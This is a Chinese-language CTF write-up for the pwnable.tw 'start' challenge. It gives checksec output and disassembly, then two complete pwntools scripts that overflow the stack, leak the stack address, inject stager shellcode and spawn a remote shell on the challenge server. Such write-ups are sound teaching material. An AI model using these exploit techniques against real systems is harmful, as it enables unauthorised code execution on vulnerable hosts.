---
title: Writeup of pwnable.tw之start
date: 2020-03-20
tags: CTF,Writeup
---

题目地址：pwable.tw

使用checksec查看开启了哪些防护措施：

```shell
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)

```

使用objdump -d进行反汇编：

```assembly
Disassembly of section .text:

08048060 <_start>:
 8048060:    54                       push   %esp
 8048061:    68 9d 80 04 08           push   $0x804809d
 8048066:    31 c0                    xor    %eax,%eax
 8048068:    31 db                    xor    %ebx,%ebx
 804806a:    31 c9                    xor    %ecx,%ecx
 804806c:    31 d2                    xor    %edx,%edx
 804806e:    68 43 54 46 3a           push   $0x3a465443
 8048073:    68 74 68 65 20           push   $0x20656874
 8048078:    68 61 72 74 20           push   $0x20747261
 804807d:    68 73 20 73 74           push   $0x74732073
 8048082:    68 4c 65 74 27           push   $0x2774654c //将要显示的字符串压栈
 8048087:    89 e1                    mov    %esp,%ecx
 8048089:    b2 14                    mov    $0x14,%dl
 804808b:    b3 01                    mov    $0x1,%bl
 804808d:    b0 04                    mov    $0x4,%al
 804808f:    cd 80                    int    $0x80
 8048091:    31 db                    xor    %ebx,%ebx
 8048093:    b2 3c                    mov    $0x3c,%dl
 8048095:    b0 03                    mov    $0x3,%al
 8048097:    cd 80                    int    $0x80
 8048099:    83 c4 14                 add    $0x14,%esp
 804809c:    c3                       ret    

0804809d <_exit>:
 804809d:    5c                       pop    %esp
 804809e:    31 c0                    xor    %eax,%eax
 80480a0:    40                       inc    %eax
 80480a1:    cd 80                    int    $0x80

```

可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。

然后执行read(0, esp_address, 0x3c)；读入字符串。

可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：

 8048060:    54                       push   %esp

可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。

具体思路如下：

```python
from pwn import *
context(arch = "i386", os = "linux")
#p = process("./start")
p = remote("chall.pwnable.tw","10000")
p.recvuntil(":")
p.send("A"*20+p32(0x8048087)) #返回到0x8048087处再执行write(1, esp_address, 0x14)
s = p.recv(4)                  #接收到esp的值
address_esp = u32(s)
ass='''mov al,0x03\n
       sub esp,0x40\n
       mov ecx,esp\n
       mov dl,0x40\n
       int 0x80\n
       jmp esp'''  #直接跳到shellcode地址处
p.send("A"*0x14+p32(address_esp+0x14)+asm(ass))#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。
sleep(3)
p.send(asm(shellcraft.sh()))#读入shellcode，
p.interactive()

```

或这样：

```python
from pwn import *
context(arch = "i386", os = "linux")
#p = process("./start")
p = remote("chall.pwnable.tw","10000")
p.recvuntil(":")
p.send("A"*20+p32(0x8048087))
s = p.recv(4)
address_esp = u32(s)
ass='''mov al,0x03\n
       sub esp,0x40\n
       mov ecx,esp\n
       mov dl,0x40\n
       int 0x80\n
       ret'''
p.send("A"*0x14+p32(address_esp+0x14)+asm(ass))
sleep(3)
p.send(p32(address_esp+0x14+0x04-0x40)+asm(shellcraft.sh()))
p.interactive()

```
